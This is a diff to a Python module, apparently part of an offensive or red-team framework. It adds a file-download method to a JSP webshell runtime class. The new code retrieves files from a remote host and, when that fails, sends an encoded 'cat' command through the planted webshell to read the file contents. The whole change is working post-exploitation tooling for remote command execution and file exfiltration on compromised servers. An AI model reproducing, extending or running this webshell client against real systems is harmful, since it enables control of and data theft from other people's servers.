@@ -2,8 +2,12 @@
 
 from __future__ import annotations
 
+import re
+import shlex
+import tempfile
 import urllib.parse
 from datetime import datetime, timezone
+from pathlib import Path
 
 from dsp.execution.providers.runtime.command import (
     CommandExecutionError,
@@ -11,12 +15,16 @@ from dsp.execution.providers.runtime.command import (
     CommandResult,
     CommandStatus,
 )
+from dsp.execution.providers.runtime.runtime_models import RuntimeArtifact, RuntimeSession
 from dsp.execution.providers.runtime.transport import (
     TransportBackedRuntime,
     TransportRuntimeConfiguration,
 )
 from dsp.execution.providers.webshell.jsp.jsp_command_encoder import JspCommandEncoder
 from dsp.execution.webshell.transport.models import TransportRequest, TransportResponse
+
+_EXIT_CODE_MARKER = re.compile(rb"\n__EXIT_CODE:\d+\s*$")
+_CAT_DOWNLOAD_FALLBACK_MARKERS = frozenset({b"ready", b"ok"})
 
 
 class JspWebshellRuntime(TransportBackedRuntime):
@@ -120,6 +128,63 @@ class JspWebshellRuntime(TransportBackedRuntime):
             ),
         )
 
+    def download_artifact(
+        self,
+        session: RuntimeSession,
+        artifact: RuntimeArtifact,
+    ) -> RuntimeArtifact:
+        """Download remote files — remote_path GET, then JSP ``cat`` fallback."""
+        stored = self._get_session(session.session_id)
+        self._require_connected(stored, operation="download_artifact")
+        response = self._dispatch_transfer(
+            "download_artifact",
+            lambda: self._transport.download(
+                self._transfer_request(),
+                remote_path=artifact.remote_path,
+            ),
+        )
+        body = response.body
+        if self._should_fallback_to_cat_download(body, artifact.remote_path):
+            body = self._download_file_via_cat(artifact.remote_path)
+        if artifact.local_path:
+            local_path = artifact.local_path
+            dest = Path(local_path)
+            dest.parent.mkdir(parents=True, exist_ok=True)
+            dest.write_bytes(body)
+        else:
+            with tempfile.NamedTemporaryFile(
+                mode="wb",
+                suffix=".jsonl",
+                delete=False,
+            ) as bundle_file:
+                bundle_file.write(body)
+                local_path = bundle_file.name
+        return self._artifact_from_response(
+            artifact,
+            transfer_status="downloaded",
+            response=response,
+            local_path=local_path,
+            size_bytes=len(body),
+        )
+
+    def _download_file_via_cat(self, remote_path: str) -> bytes:
+        cat_command = f"cat {shlex.quote(remote_path)}"
+        encoded_payload = self._command_encoder.encode_request(
+            CommandRequest.new(cat_command)
+        )
+        transport_request = self._command_transport_request(
+            encoded_payload,
+            transport_method="send_get",
+            timeout_seconds=300.0,
+        )
+        response = self._transport.send_get(transport_request)
+        return _strip_webshell_exit_marker(response.body)
+
+    @staticmethod
+    def _should_fallback_to_cat_download(body: bytes, remote_path: str) -> bool:
+        del remote_path
+        return body.strip() in _CAT_DOWNLOAD_FALLBACK_MARKERS
+
     @staticmethod
     def _jsp_execution_metadata(
         *,
@@ -137,3 +202,7 @@ class JspWebshellRuntime(TransportBackedRuntime):
             "delivery_only": True,
             "jsp_command_param": JspCommandEncoder.COMMAND_PARAM,
         }
+
+
+def _strip_webshell_exit_marker(body: bytes) -> bytes:
+    return _EXIT_CODE_MARKER.sub(b"", body.rstrip())
